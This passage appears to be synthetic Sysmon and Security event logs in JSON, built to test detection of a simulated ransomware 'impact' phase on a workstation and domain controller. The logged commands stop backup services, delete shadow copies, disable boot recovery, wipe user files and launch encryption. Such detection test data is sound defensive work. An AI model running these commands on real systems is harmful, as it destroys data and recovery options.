@@ -1,0 +1,2191 @@
+{
+  "_metadata": {
+    "engagement": "ransomware",
+    "phase": "impact",
+    "phase_number": 10,
+    "description": "Impact phase of Ransomware - example-corp",
+    "techniques": [
+      "T1489",
+      "T1486",
+      "T1490",
+      "T1485"
+    ],
+    "timespan": "T+8:19:30 to T+23:34:30",
+    "attacker_logic": "Attacker executes impact techniques",
+    "format": "wazuh-native",
+    "format_version": "2.0"
+  },
+  "attacker_profile": {
+    "c2_server": "185.141.27.98",
+    "initial_target": "WS01.corp.local",
+    "compromised_user": "CORP\\jsmith"
+  },
+  "logs": [
+    {
+      "_comment": "Stop Volume Shadow Copy service",
+      "sequence": 1,
+      "relative_time": "T+8:19:30",
+      "timestamp": "2026-01-30T16:19:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop vss /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:19:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop SQL Server service",
+      "sequence": 2,
+      "relative_time": "T+8:20:30",
+      "timestamp": "2026-01-30T16:20:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop sql /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:20:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Backup services service",
+      "sequence": 3,
+      "relative_time": "T+8:22:00",
+      "timestamp": "2026-01-30T16:22:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop svc$ /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:22:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop MemSQL service",
+      "sequence": 4,
+      "relative_time": "T+8:24:00",
+      "timestamp": "2026-01-30T16:24:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop memtas /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:24:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Sophos service",
+      "sequence": 5,
+      "relative_time": "T+8:26:30",
+      "timestamp": "2026-01-30T16:26:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop mepocs /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:26:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Veeam Backup service",
+      "sequence": 6,
+      "relative_time": "T+8:29:30",
+      "timestamp": "2026-01-30T16:29:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop veeam /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:29:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Windows Backup service",
+      "sequence": 7,
+      "relative_time": "T+8:33:00",
+      "timestamp": "2026-01-30T16:33:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:07.274",
+            "ProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ProcessId": "6012",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop backup /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ParentProcessId": "4944",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:33:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Sysmon)",
+      "sequence": 8,
+      "relative_time": "T+8:37:00",
+      "timestamp": "2026-01-30T16:37:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:07:25.699",
+            "ProcessGuid": "{C257A465-WS01-0052-BED6E6BB5874}",
+            "ProcessId": "6254",
+            "Image": "C:\\Windows\\System32\\vssadmin.exe",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=9B7C7C0CDEAA3F26B9D1A0CAFE1234567890ABCDEF1234567890ABCDEF123456",
+            "ParentProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ParentProcessId": "6126",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:37:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Security)",
+      "sequence": 9,
+      "relative_time": "T+8:41:30",
+      "timestamp": "2026-01-30T16:41:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x186E",
+            "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x17EE",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:41:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Sysmon)",
+      "sequence": 10,
+      "relative_time": "T+8:46:30",
+      "timestamp": "2026-01-30T16:46:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:07:37.419",
+            "ProcessGuid": "{C257A465-WS01-0053-61DF4FB68937}",
+            "ProcessId": "6333",
+            "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=3B7C3E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D",
+            "ParentProcessGuid": "{C257A465-WS01-0052-BED6E6BB5874}",
+            "ParentProcessId": "6254",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:46:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Security)",
+      "sequence": 11,
+      "relative_time": "T+8:52:00",
+      "timestamp": "2026-01-30T16:52:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x18BD",
+            "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x186E",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:52:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Sysmon)",
+      "sequence": 12,
+      "relative_time": "T+8:58:00",
+      "timestamp": "2026-01-30T16:58:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:07:50.952",
+            "ProcessGuid": "{C257A465-WS01-0054-5F8A0B62615E}",
+            "ProcessId": "6404",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0053-61DF4FB68937}",
+            "ParentProcessId": "6333",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T16:58:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Security)",
+      "sequence": 13,
+      "relative_time": "T+9:04:30",
+      "timestamp": "2026-01-30T17:04:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1904",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x18BD",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:04:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Sysmon)",
+      "sequence": 14,
+      "relative_time": "T+9:11:30",
+      "timestamp": "2026-01-30T17:11:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:07:50.952",
+            "ProcessGuid": "{C257A465-WS01-0054-5F8A0B62615E}",
+            "ProcessId": "6404",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0053-61DF4FB68937}",
+            "ParentProcessId": "6333",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:11:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Security)",
+      "sequence": 15,
+      "relative_time": "T+9:19:00",
+      "timestamp": "2026-01-30T17:19:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1904",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x18BD",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:19:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Data destruction via SDelete",
+      "sequence": 16,
+      "relative_time": "T+9:27:00",
+      "timestamp": "2026-01-30T17:27:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:23.119",
+            "ProcessGuid": "{C257A465-WS01-0055-7A9513DF2B41}",
+            "ProcessId": "6566",
+            "Image": "C:\\Windows\\System32\\sdelete64.exe",
+            "CommandLine": "sdelete64.exe -p 3 -s C:\\Users\\*\\Documents\\*",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0054-5F8A0B62615E}",
+            "ParentProcessId": "6404",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:27:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Free space overwrite via cipher.exe",
+      "sequence": 17,
+      "relative_time": "T+9:35:30",
+      "timestamp": "2026-01-30T17:35:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:30.128",
+            "ProcessGuid": "{C257A465-WS01-0056-A175DE329961}",
+            "ProcessId": "6609",
+            "Image": "C:\\Windows\\System32\\cipher.exe",
+            "CommandLine": "cipher.exe /w:C:",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0055-7A9513DF2B41}",
+            "ParentProcessId": "6566",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:35:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Sysmon)",
+      "sequence": 18,
+      "relative_time": "T+9:44:30",
+      "timestamp": "2026-01-30T17:44:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:34.085",
+            "ProcessGuid": "{C257A465-WS01-0057-44A32ACCF625}",
+            "ProcessId": "6793",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\jsmith\\Documents",
+            "CurrentDirectory": "C:\\Users\\Public\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=BADCAFE0DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
+            "ParentProcessGuid": "{C257A465-WS01-0056-A175DE329961}",
+            "ParentProcessId": "6609",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:44:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Security)",
+      "sequence": 19,
+      "relative_time": "T+9:54:00",
+      "timestamp": "2026-01-30T17:54:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "SubjectUserName": "jsmith",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1A89",
+            "NewProcessName": "C:\\Users\\Public\\ransomware.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x19D1",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\jsmith\\Documents",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "TargetUserName": "jsmith",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T17:54:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "File encryption (ransomware)",
+      "sequence": 20,
+      "relative_time": "T+10:04:00",
+      "timestamp": "2026-01-30T18:04:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 11,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:34.085",
+            "ProcessGuid": "{C257A465-WS01-0057-44A32ACCF625}",
+            "ProcessId": "6793",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "TargetFilename": "C:\\Users\\jsmith\\Documents\\important.encrypted",
+            "CreationUtcTime": "2026-01-30 12:08:34.085",
+            "User": "EXAMPLE\\jsmith"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T18:04:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Volume Shadow Copy service",
+      "sequence": 21,
+      "relative_time": "T+10:14:30",
+      "timestamp": "2026-01-30T18:14:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop vss /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T18:14:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop SQL Server service",
+      "sequence": 22,
+      "relative_time": "T+10:25:30",
+      "timestamp": "2026-01-30T18:25:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop sql /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T18:25:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop Backup services service",
+      "sequence": 23,
+      "relative_time": "T+10:37:00",
+      "timestamp": "2026-01-30T18:37:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop svc$ /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ParentProcessId": "5062",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T18:37:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Stop MemSQL service",
+      "sequence": 24,
+      "relative_time": "T+10:49:00",
+      "timestamp": "2026-01-30T18:49:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:08:48.262",
+            "ProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ProcessId": "6821",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net stop memtas /y",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
